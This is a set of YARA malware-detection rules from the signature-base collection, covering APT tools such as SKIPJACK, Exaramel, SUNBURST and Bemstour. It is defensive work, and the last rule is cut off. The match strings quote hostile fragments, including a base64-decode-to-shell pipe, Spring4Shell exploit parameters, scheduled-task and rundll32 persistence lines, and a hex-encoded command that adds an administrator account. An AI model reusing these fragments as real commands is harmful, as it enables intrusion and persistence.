rule SIGNATURE_BASE_APT_MAL_LUA_Hunting_SKIPJACK_1
{
	meta:
		description = "Hunting rule looking for strings observed in SKIPJACK installation script."
		author = "Mandiant"
		id = "0026375c-7f37-5ef9-bd55-5b9fc499e5d2"
		date = "2023-06-15"
		modified = "2023-12-05"
		reference = "https://www.mandiant.com/resources/blog/barracuda-esg-exploited-globally"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_barracuda_esg_unc4841_jun23.yar#L175-L193"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "e4e86c273a2b67a605f5d4686783e0cc"
		logic_hash = "8890cd9ab8190f12997e0653e43c89816df03c7bd41842e5ad21b1986819843e"
		score = 70
		quality = 85
		tags = ""

	strings:
		$str1 = "hdr:name() == 'Content-ID'" base64
		$str2 = "hdr:body() ~= nil" base64
		$str3 = "string.match(hdr:body(),\"^[%w%+/=\\r\\n]+$\")" base64
		$str4 = "openssl aes-256-cbc" base64
		$str5 = "mod_content.lua"
		$str6 = "#!/bin/sh"

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_MAL_LUA_Hunting_Lua_SKIPJACK_2
{
	meta:
		description = "Hunting rule looking for strings observed in SKIPJACK samples."
		author = "Mandiant"
		id = "e1eac294-fe60-5bb2-bae4-0f7bcbe6b1db"
		date = "2023-06-15"
		modified = "2023-12-05"
		reference = "https://www.mandiant.com/resources/blog/barracuda-esg-exploited-globally"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_barracuda_esg_unc4841_jun23.yar#L195-L212"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "87847445f9524671022d70f2a812728f"
		logic_hash = "093e8857c410bd30a076f87ef63d7e1e66f50e3dce75b4add67161782386ee24"
		score = 70
		quality = 85
		tags = ""

	strings:
		$str1 = "hdr:name() == 'Content-ID'"
		$str2 = "hdr:body() ~= nil"
		$str3 = "string.match(hdr:body(),\"^[%w%+/=\\r\\n]+$\")"
		$str4 = "openssl aes-256-cbc"
		$str5 = "| base64 -d| sh 2>"

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_MAL_LUA_Hunting_Lua_SEASPRAY_1
{
	meta:
		description = "Hunting rule looking for strings observed in SEASPRAY samples."
		author = "Mandiant"
		id = "8c744b85-b61e-56d0-8a9e-ae6a954e1b95"
		date = "2023-06-15"
		modified = "2023-12-05"
		reference = "https://www.mandiant.com/resources/blog/barracuda-esg-exploited-globally"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_barracuda_esg_unc4841_jun23.yar#L213-L228"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "35cf6faf442d325961935f660e2ab5a0"
		logic_hash = "856bfb47557b60f69aa1141477d6ce446ea13ebbe899022d7996ceef08bdefbb"
		score = 70
		quality = 85
		tags = ""

	strings:
		$str1 = "string.find(attachment:filename(),'obt075') ~= nil"
		$str2 = "os.execute('cp '..tostring(tmpfile)..' /tmp/'..attachment:filename())"
		$str3 = "os.execute('rverify'..' /tmp/'..attachment:filename())"

	condition:
		all of them
}

rule SIGNATURE_BASE_Apt3_Bemstour_Implant_Byte_Patch
{
	meta:
		description = "Detects an implant used by Bemstour exploitation tool (APT3)"
		author = "Mark Lechtik"
		id = "c30434c3-8949-566c-b6a6-29bffdaf961d"
		date = "2019-06-25"
		modified = "2023-12-04"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_apt3_bemstour.yar#L69-L104"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "0b28433a2b7993da65e95a45c2adf7bc37edbd2a8db717b85666d6c88140698a"
		logic_hash = "08de2c885ccb24cb247efdcc06bbcbea144d652744b2d38aaa2aabfd341e4f91"
		score = 75
		quality = 85
		tags = ""
		company = "Check Point Software Technologies LTD."

	strings:
		$chunk_1 = {

C7 45 ?? 55 8B EC 83
C7 45 ?? EC 74 53 56
C7 45 ?? 8B 75 08 33
C7 45 ?? C9 57 C7 45
C7 45 ?? 8C 4C 6F 61

}

	condition:
		any of them
}

rule SIGNATURE_BASE_Apt3_Bemstour_Implant_Command_Stack_Variable
{
	meta:
		description = "Detecs an implant used by Bemstour exploitation tool (APT3)"
		author = "Mark Lechtik"
		id = "c773da5a-2d3f-5a0a-af2e-28ad382622b3"
		date = "2019-06-25"
		modified = "2023-12-04"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_apt3_bemstour.yar#L107-L275"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "0b28433a2b7993da65e95a45c2adf7bc37edbd2a8db717b85666d6c88140698a"
		logic_hash = "36710db313a52db2a0c0af356e701d3a36e5597203e87fd7f8586d202738be33"
		score = 75
		quality = 85
		tags = ""
		company = "Check Point Software Technologies LTD."

	strings:
		$chunk_1 = {

C7 85 ?? ?? ?? ?? 63 6D 64 2E
C7 85 ?? ?? ?? ?? 65 78 65 20
C7 85 ?? ?? ?? ?? 2F 63 20 63
C7 85 ?? ?? ?? ?? 6F 70 79 20
C7 85 ?? ?? ?? ?? 25 77 69 6E
C7 85 ?? ?? ?? ?? 64 69 72 25
C7 85 ?? ?? ?? ?? 5C 73 79 73
C7 85 ?? ?? ?? ?? 74 65 6D 33
C7 85 ?? ?? ?? ?? 32 5C 63 6D
C7 85 ?? ?? ?? ?? 64 2E 65 78
C7 85 ?? ?? ?? ?? 65 20 25 77
C7 85 ?? ?? ?? ?? 69 6E 64 69
C7 85 ?? ?? ?? ?? 72 25 5C 73
C7 85 ?? ?? ?? ?? 79 73 74 65
C7 85 ?? ?? ?? ?? 6D 33 32 5C
C7 85 ?? ?? ?? ?? 73 65 74 68
C7 85 ?? ?? ?? ?? 63 2E 65 78
C7 85 ?? ?? ?? ?? 65 20 2F 79
83 A5 ?? ?? ?? ?? 00
}
		$chunk_2 = {

C7 85 ?? ?? ?? ?? 63 6D 64 20
C7 85 ?? ?? ?? ?? 2F 63 20 22
C7 85 ?? ?? ?? ?? 6E 65 74 20
C7 85 ?? ?? ?? ?? 75 73 65 72
C7 85 ?? ?? ?? ?? 20 63 65 73
C7 85 ?? ?? ?? ?? 73 75 70 70
C7 85 ?? ?? ?? ?? 6F 72 74 20
C7 85 ?? ?? ?? ?? 31 71 61 7A
C7 85 ?? ?? ?? ?? 23 45 44 43
C7 85 ?? ?? ?? ?? 20 2F 61 64
C7 85 ?? ?? ?? ?? 64 20 26 26
C7 85 ?? ?? ?? ?? 20 6E 65 74
C7 85 ?? ?? ?? ?? 20 6C 6F 63
C7 85 ?? ?? ?? ?? 61 6C 67 72
C7 85 ?? ?? ?? ?? 6F 75 70 20
C7 85 ?? ?? ?? ?? 61 64 6D 69
C7 85 ?? ?? ?? ?? 6E 69 73 74
C7 85 ?? ?? ?? ?? 72 61 74 6F
C7 85 ?? ?? ?? ?? 72 73 20 63
C7 85 ?? ?? ?? ?? 65 73 73 75
C7 85 ?? ?? ?? ?? 70 70 6F 72
C7 85 ?? ?? ?? ?? 74 20 2F 61
C7 85 ?? ?? ?? ?? 64 64 22 00
6A 5C

}
		$chunk_3 = {

C7 45 ?? 57 69 6E 45
C7 45 ?? 78 65 63 00
C7 45 ?? 47 65 74 50
C7 45 ?? 72 6F 63 41
C7 45 ?? 64 64 72 65
C7 45 ?? 73 73 00 00
C7 45 ?? 43 72 65 61
C7 45 ?? 74 65 46 69
C7 45 ?? 6C 65 41 00
C7 45 ?? 57 72 69 74
C7 45 ?? 65 46 69 6C
C7 45 ?? 65 00 00 00
C7 45 ?? 43 6C 6F 73
C7 45 ?? 65 48 61 6E
C7 45 ?? 64 6C 65 00
89 4D ??

}

	condition:
		any of them
}

rule SIGNATURE_BASE_MAL_KHRAT_Script
{
	meta:
		description = "Rule derived from KHRAT script but can match on other malicious scripts as well"
		author = "Florian Roth (Nextron Systems)"
		id = "fd345647-4887-560e-a6b2-129a880026aa"
		date = "2017-08-31"
		modified = "2023-12-05"
		reference = "https://researchcenter.paloaltonetworks.com/2017/08/unit42-updated-khrat-malware-used-in-cambodia-attacks/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_khrat.yar#L26-L41"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "c27a89028794b50b95850d90ee29b56606e6b58b862a26e287077e7f7be7f096"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "8c88b4177b59f4cac820b0019bcc7f6d3d50ce4badb689759ab0966780ae32e3"

	strings:
		$x1 = "CreateObject(\"WScript.Shell\").Run \"schtasks /create /sc MINUTE /tn" ascii
		$x2 = "CreateObject(\"WScript.Shell\").Run \"rundll32.exe javascript:\"\"\\..\\mshtml,RunHTMLApplication" ascii
		$x3 = "<registration progid=\"ff010f\" classid=\"{e934870c-b429-4d0d-acf1-eef338b92c4b}\" >" fullword ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_WEBSHELL_PAS_Webshell_Ziparchivefile
{
	meta:
		description = "Detects an archive file created by P.A.S. for download operation"
		author = "FR/ANSSI/SDO (modified by Florian Roth)"
		id = "081cc65b-e51c-59fc-a518-cd986e8ee2f7"
		date = "2021-02-15"
		modified = "2024-05-25"
		reference = "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_sandworm_centreon.yar#L30-L42"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "c15e7022f45ec211ba635d6cd31bab16f4fb0d3038fb19d5765e0f751c14a826"
		score = 80
		quality = 85
		tags = ""

	strings:
		$s1 = "Archive created by P.A.S. v."

	condition:
		$s1
}

rule SIGNATURE_BASE_WEBSHELL_PAS_Webshell_Sqldumpfile
{
	meta:
		description = "Detects SQL dump file created by P.A.S. webshell"
		author = "FR/ANSSI/SDO"
		id = "4c26feeb-3031-5c91-9eeb-4b5fe9702e39"
		date = "2021-02-15"
		modified = "2024-05-25"
		reference = "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_sandworm_centreon.yar#L64-L76"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "c34abcada22fdf462fd66cc2da18ab9e54215defc6f7a7a95b5a80d1155a2ffe"
		score = 90
		quality = 85
		tags = ""

	strings:
		$ = "-- [ SQL Dump created by P.A.S. ] --"

	condition:
		1 of them
}

rule SIGNATURE_BASE_APT_MAL_Sandworm_Exaramel_Configuration_Key
{
	meta:
		description = "Detects the encryption key for the configuration file used by Exaramel malware as seen in sample e1ff72[...]"
		author = "FR/ANSSI/SDO"
		id = "8078de62-3dd2-5ee0-8bda-f508e4013144"
		date = "2021-02-15"
		modified = "2024-05-25"
		reference = "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_sandworm_centreon.yar#L78-L90"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "056503a2c240a641cd2292a30ab1090e3a358cb4d57dca83b836ecb1bc62ed6b"
		score = 80
		quality = 85
		tags = ""

	strings:
		$ = "odhyrfjcnfkdtslt"

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_MAL_Sandworm_Exaramel_Configuration_Name_Encrypted
{
	meta:
		description = "Detects the specific name of the configuration file in Exaramel malware as seen in sample e1ff72[...]"
		author = "FR/ANSSI/SDO"
		id = "1c06f5fc-3435-51cd-92fb-17a4ab6b63ad"
		date = "2021-02-15"
		modified = "2024-05-25"
		reference = "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_sandworm_centreon.yar#L92-L104"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "f65d59381403534a2c2f39d66c7c62bf1540eafc9aad1ad73de1809e91c42446"
		score = 80
		quality = 85
		tags = ""

	strings:
		$ = "configtx.json"

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_MAL_Sandworm_Exaramel_Configuration_File_Ciphertext
{
	meta:
		description = "Detects contents of the configuration file used by Exaramel (encrypted with key odhyrfjcnfkdtslt, sample e1ff72[...]"
		author = "FR/ANSSI/SDO"
		id = "763dbb17-2bad-5b40-8a7b-b71bc5849cd9"
		date = "2021-02-15"
		modified = "2024-05-25"
		reference = "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_sandworm_centreon.yar#L120-L132"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "9dc7ee5b0a218a2b5be652e137fa090c944c3ddb0f699f521a72896668210813"
		score = 80
		quality = 85
		tags = ""

	strings:
		$ = { 6F B6 08 E9 A3 0C 8D 5E DD BE D4 }

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_MAL_Sandworm_Exaramel_Socket_Path
{
	meta:
		description = "Detects path of the unix socket created to prevent concurrent executions in Exaramel malware"
		author = "FR/ANSSI/SDO"
		id = "3aab84c9-9748-5d11-9cd7-efa9151036cf"
		date = "2021-02-15"
		modified = "2024-05-25"
		reference = "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_sandworm_centreon.yar#L134-L146"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "8c049b5a7b508ca0f160d166f3c726e4a23a2c5b3105d075d7bf7a301a1c58f6"
		score = 80
		quality = 85
		tags = ""

	strings:
		$ = "/tmp/.applocktx"

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_MAL_Sandworm_Exaramel_Task_Names
{
	meta:
		description = "Detects names of the tasks received from the CC server in Exaramel malware"
		author = "FR/ANSSI/SDO"
		id = "185f2f3b-bf5c-54af-bca2-400d08bf9c91"
		date = "2021-02-15"
		modified = "2024-05-25"
		reference = "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_sandworm_centreon.yar#L148-L167"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "193482da1e2b9509fa9c65d46edc56057f7b5d44b7408d918d4a9cbb60736dab"
		score = 80
		quality = 85
		tags = ""

	strings:
		$ = "App.Delete"
		$ = "App.SetServer"
		$ = "App.SetProxy"
		$ = "App.SetTimeout"
		$ = "App.Update"
		$ = "IO.ReadFile"
		$ = "IO.WriteFile"
		$ = "OS.ShellExecute"

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_MAL_Sandworm_Exaramel_Struct
{
	meta:
		description = "Detects the beginning of type _type struct for some of the most important structs in Exaramel malware"
		author = "FR/ANSSI/SDO"
		id = "8282e485-966c-554d-8e41-70dc1657f5ea"
		date = "2021-02-15"
		modified = "2024-05-25"
		reference = "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_sandworm_centreon.yar#L169-L185"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "312d0598fa85837f94023036468fcae50e8b2de532430a944befa8090afe79f6"
		score = 80
		quality = 85
		tags = ""

	strings:
		$struct_le_config = {70 00 00 00 00 00 00 00 58 00 00 00 00 00 00 00 47 2d 28 42 0? [2] 19}
		$struct_le_worker = {30 00 00 00 00 00 00 00 30 00 00 00 00 00 00 00 46 6a 13 e2 0? [2] 19}
		$struct_le_client = {20 00 00 00 00 00 00 00 10 00 00 00 00 00 00 00 7b 6a 49 84 0? [2] 19}
		$struct_le_report = {30 00 00 00 00 00 00 00 28 00 00 00 00 00 00 00 bf 35 0d f9 0? [2] 19}
		$struct_le_task = {50 00 00 00 00 00 00 00 20 00 00 00 00 00 00 00 88 60 a1 c5 0? [2] 19}

	condition:
		any of them
}

rule SIGNATURE_BASE_APT_MAL_Sandworm_Exaramel_Strings_Typo
{
	meta:
		description = "Detects misc strings in Exaramel malware with typos"
		author = "FR/ANSSI/SDO"
		id = "fdc79b87-eb9e-5751-9474-ff653b073165"
		date = "2021-02-15"
		modified = "2024-05-25"
		reference = "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_sandworm_centreon.yar#L187-L202"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "65e6de743eb9fc742674c7e54eef8a376963a6fd4380bacd03fe6f92d4235920"
		score = 80
		quality = 85
		tags = ""

	strings:
		$typo1 = "/sbin/init | awk "
		$typo2 = "Syslog service for monitoring \n"
		$typo3 = "Error.Can't update app! Not enough update archive."
		$typo4 = ":\"metod\""

	condition:
		3 of ( $typo* )
}

rule SIGNATURE_BASE_APT_MAL_Sandworm_Exaramel_Strings
{
	meta:
		description = "Detects Strings used by Exaramel malware"
		author = "FR/ANSSI/SDO (composed from 4 saparate rules by Florian Roth)"
		id = "fdc79b87-eb9e-5751-9474-ff653b073165"
		date = "2021-02-15"
		modified = "2024-05-25"
		reference = "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_sandworm_centreon.yar#L204-L232"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "9d2790e60184ed973b2735263d0a997f32af0beacc9ea8ef65926fe6507011d5"
		score = 80
		quality = 85
		tags = ""

	strings:
		$persistence1 = "systemd"
		$persistence2 = "upstart"
		$persistence3 = "systemV"
		$persistence4 = "freebsd rc"
		$report1 = "systemdupdate.rep"
		$report2 = "upstartupdate.rep"
		$report3 = "remove.rep"
		$url1 = "/tasks.get/"
		$url2 = "/time.get/"
		$url3 = "/time.set"
		$url4 = "/tasks.report"
		$url5 = "/attachment.get/"
		$url6 = "/auth/app"

	condition:
		(5 of ( $url* ) and all of ( $persistence* ) ) or ( all of ( $persistence* ) and all of ( $report* ) ) or ( 5 of ( $url* ) and all of ( $report* ) )
}

rule SIGNATURE_BASE_Custom_Ssh_Backdoor_Server
{
	meta:
		description = "Custome SSH backdoor based on python and paramiko - file server.py"
		author = "Florian Roth (Nextron Systems)"
		id = "eccf705b-b2c3-5af6-ab86-70292089812b"
		date = "2015-05-14"
		modified = "2022-08-18"
		reference = "https://goo.gl/S46L3o"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_backdoor_ssh_python.yar#L2-L17"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "0953b6c2181249b94282ca5736471f85d80d41c9"
		logic_hash = "7bb142b69a75003e8f26d462c0895a3d807d5c326684e83d756178a3b91669dc"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "command= raw_input(\"Enter command: \").strip('n')" fullword ascii
		$s1 = "print '[-] (Failed to load moduli -- gex will be unsupported.)'" fullword ascii
		$s2 = "print '[-] Listen/bind/accept failed: ' + str(e)" fullword ascii

	condition:
		2 of them
}

rule SIGNATURE_BASE_EXPL_POC_Springcore_0Day_Indicators_Mar22_1
{
	meta:
		description = "Detects indicators found after SpringCore exploitation attempts and in the POC script"
		author = "Florian Roth (Nextron Systems)"
		id = "297e4b57-f831-56e0-a391-1ffbc9a4d438"
		date = "2022-03-30"
		modified = "2023-12-05"
		reference = "https://twitter.com/vxunderground/status/1509170582469943303"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/expl_spring4shell.yar#L19-L34"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "39fb62ec7953dae0a88e39e73e3ff286fc19cb8f21f8feb869a1875f6ba70cfb"
		score = 70
		quality = 85
		tags = ""

	strings:
		$x1 = "java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di"
		$x2 = "?pwd=j&cmd=whoami"
		$x3 = ".getParameter(%22pwd%22)"
		$x4 = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7B"

	condition:
		1 of them
}

rule SIGNATURE_BASE_APT_Backdoor_SUNBURST_1
{
	meta:
		description = "This rule is looking for portions of the SUNBURST backdoor that are vital to how it functions. The first signature fnv_xor matches a magic byte xor that the sample performs on process, service, and driver names/paths. SUNBURST is a backdoor that has the ability to spawn and kill processes, write and delete files, set and create registry keys, gather system information, and disable a set of forensic analysis tools and services."
		author = "FireEye"
		id = "74b44844-5575-53d7-819b-ab1b2327a144"
		date = "2020-12-14"
		modified = "2023-12-05"
		reference = "https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_solarwinds_sunburst.yar#L6-L27"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "1fc006dead2fd540717e00e468bf30f37bdb1d061a805e33683e4a77db7f9156"
		score = 85
		quality = 77
		tags = ""

	strings:
		$cmd_regex_encoded = "U4qpjjbQtUzUTdONrTY2q42pVapRgooABYxQuIZmtUoA" wide
		$cmd_regex_plain = { 5C 7B 5B 30 2D 39 61 2D 66 2D 5D 7B 33 36 7D 5C 7D 22 7C 22 5B 30 2D 39 61 2D 66 5D 7B 33 32 7D 22 7C 22 5B 30 2D 39 61 2D 66 5D 7B 31 36 7D }
		$fake_orion_event_encoded = "U3ItS80rCaksSFWyUvIvyszPU9IBAA==" wide
		$fake_orion_event_plain = { 22 45 76 65 6E 74 54 79 70 65 22 3A 22 4F 72 69 6F 6E 22 2C }
		$fake_orion_eventmanager_encoded = "U3ItS80r8UvMTVWyUgKzfRPzEtNTi5R0AA==" wide
		$fake_orion_eventmanager_plain = { 22 45 76 65 6E 74 4E 61 6D 65 22 3A 22 45 76 65 6E 74 4D 61 6E 61 67 65 72 22 2C }
		$fake_orion_message_encoded = "U/JNLS5OTE9VslKqNqhVAgA=" wide
		$fake_orion_message_plain = { 22 4D 65 73 73 61 67 65 22 3A 22 7B 30 7D 22 }
		$fnv_xor = { 67 19 D8 A7 3B 90 AC 5B }

	condition:
		$fnv_xor and ( $cmd_regex_encoded or $cmd_regex_plain ) or ( ( $fake_orion_event_encoded or $fake_orion_event_plain ) and ( $fake_orion_eventmanager_encoded or $fake_orion_eventmanager_plain ) and ( $fake_orion_message_encoded and $fake_orion_message_plain ) )
}

rule SIGNATURE_BASE_APT_Backdoor_SUNBURST_2
{
	meta:
		description = "The SUNBURST backdoor uses a domain generation algorithm (DGA) as part of C2 communications. This rule is looking for each branch of the code that checks for which HTTP method is being used. This is in one large conjunction, and all branches are then tied together via disjunction. The grouping is intentionally designed so that if any part of the DGA is re-used in another sample, this signature should match that re-used portion. SUNBURST is a backdoor that has the ability to spawn and kill processes, write and delete files, set and create registry keys, gather system information, and disable a set of forensic analysis tools and services."
		author = "FireEye"
		id = "329071d5-c9c6-5ae1-a514-aea9f4037bac"
		date = "2020-12-14"
		modified = "2023-12-05"
		reference = "https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_solarwinds_sunburst.yar#L28-L79"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "2bf0697b110bca88f712cbccaf0d2ba614d6093d6d9595659aefe088848d3826"
		score = 85
		quality = 83
		tags = ""

	strings:
		$a = "0y3Kzy8BAA==" wide
		$aa = "S8vPKynWL89PS9OvNqjVrTYEYqNa3fLUpDSgTLVxrR5IzggA" wide
		$ab = "S8vPKynWL89PS9OvNqjVrTYEYqPaauNaPZCYEQA=" wide
		$ac = "C88sSs1JLS4GAA==" wide
		$ad = "C/UEAA==" wide
		$ae = "C89MSU8tKQYA" wide
		$af = "8wvwBQA=" wide
		$ag = "cyzIz8nJBwA=" wide
		$ah = "c87JL03xzc/LLMkvysxLBwA=" wide
		$ai = "88tPSS0GAA==" wide
		$aj = "C8vPKc1NLQYA" wide
		$ak = "88wrSS1KS0xOLQYA" wide
		$al = "c87PLcjPS80rKQYA" wide
		$am = "Ky7PLNAvLUjRBwA=" wide
		$an = "06vIzQEA" wide
		$b = "0y3NyyxLLSpOzIlPTgQA" wide
		$c = "001OBAA=" wide
		$d = "0y0oysxNLKqMT04EAA==" wide
		$e = "0y3JzE0tLknMLQAA" wide
		$f = "003PyU9KzAEA" wide
		$h = "0y1OTS4tSk1OBAA=" wide
		$i = "K8jO1E8uytGvNqitNqytNqrVA/IA" wide
		$j = "c8rPSQEA" wide
		$k = "c8rPSfEsSczJTAYA" wide
		$l = "c60oKUp0ys9JAQA=" wide
		$m = "c60oKUp0ys9J8SxJzMlMBgA=" wide
		$n = "8yxJzMlMBgA=" wide
		$o = "88lMzygBAA==" wide
		$p = "88lMzyjxLEnMyUwGAA==" wide
		$q = "C0pNL81JLAIA" wide
		$r = "C07NzXTKz0kBAA==" wide
		$s = "C07NzXTKz0nxLEnMyUwGAA==" wide
		$t = "yy9IzStOzCsGAA==" wide
		$u = "y8svyQcA" wide
		$v = "SytKTU3LzysBAA==" wide
		$w = "C84vLUpOdc5PSQ0oygcA" wide
		$x = "C84vLUpODU4tykwLKMoHAA==" wide
		$y = "C84vLUpO9UjMC07MKwYA" wide
		$z = "C84vLUpO9UjMC04tykwDAA==" wide

	condition:
		($a and $b and $c and $d and $e and $f and $h and $i ) or ( $j and $k and $l and $m and $n and $o and $p and $q and $r and $s and ( $aa or $ab ) ) or ( $t and $u and $v and $w and $x and $y and $z and ( $aa or $ab ) ) or ( $ac and $ad and $ae and $af and $ag and $ah and ( $am or $an ) ) or ( $ai and $aj and $ak and $al and ( $am or $an ) )
}

rule SIGNATURE_BASE_APT_Hacktool_PS1_COSMICGALE_1
{
	meta:
		description = "This rule detects various unique strings related to COSMICGALE. COSMICGALE is a credential theft and reconnaissance PowerShell script that collects credentials using the publicly available Get-PassHashes routine. COSMICGALE clears log files, writes acquired data to a hard coded path, and encrypts the file with a password."
		author = "FireEye"
		id = "c094943c-288e-5835-8066-8e95a992c76c"
		date = "2020-12-14"
		modified = "2023-12-05"
		reference = "https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_solarwinds_sunburst.yar#L119-L140"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "c7b4d3c29d57b8db8d21e3a436c83617bc3fe14e66ccc1500b33a3774f09ee12"
		score = 85
		quality = 40
		tags = ""

	strings:
		$sr1 = /\[byte\[\]\]@\([\x09\x20]{0,32}0xaa[\x09\x20]{0,32},[\x09\x20]{0,32}0xd3[\x09\x20]{0,32},[\x09\x20]{0,32}0xb4[\x09\x20]{0,32},[\x09\x20]{0,32}0x35[\x09\x20]{0,32},/ ascii nocase wide
